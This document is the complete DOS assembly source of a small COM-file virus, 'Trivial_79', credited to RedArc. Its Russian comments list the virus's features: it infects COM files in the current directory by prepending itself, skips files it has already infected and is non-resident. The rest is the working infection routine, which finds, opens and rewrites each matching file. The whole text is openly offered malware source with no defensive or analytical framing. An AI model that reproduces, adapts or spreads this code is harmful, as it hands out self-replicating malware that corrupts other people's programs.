; Trivial_79 (c) by RedArc

;■ поиск и инфицирование COM-файлов в текущем каталоге
;■ инфицирование в начало
;■ не исполняет код программы-жертвы
;■ не портит код жертвы, что делает возможным его лечение
;■ не заражает повторно уже инфицированные программы
;■ не резидентный

Model Tiny
.code
org 100h
start:
       xchg dx,ax
       inc ah
       mov es,ax
       mov di,si
       mov cl,virlength
       rep movsb
       mov dx,(virlength-6)+100h
       mov ah,4eh
@0:
       int 21h
       jnb @1
       ret
@1:
       mov ax,3d02h
       cwd
       mov dl,9eh
       int 21h
       xchg bx,ax
       mov ah,3fh
       push es
       pop ds
       mov dx,virlength+100h
       push sp
       pop cx
       int 21h
       cmp byte ptr ds:[virlength+100h],092h
       je @2
       add ax,virlength
       push ax
       xor cx,cx
       mul cx
       mov ah,42h
       int 21h
       pop cx
       mov ah,40h
       inc dh
       int 21h
@2:
       push cs
       pop ds
       mov ah,4fh
       jmp short @0
filename db '*.com', 0h
virlength equ $-start
end start
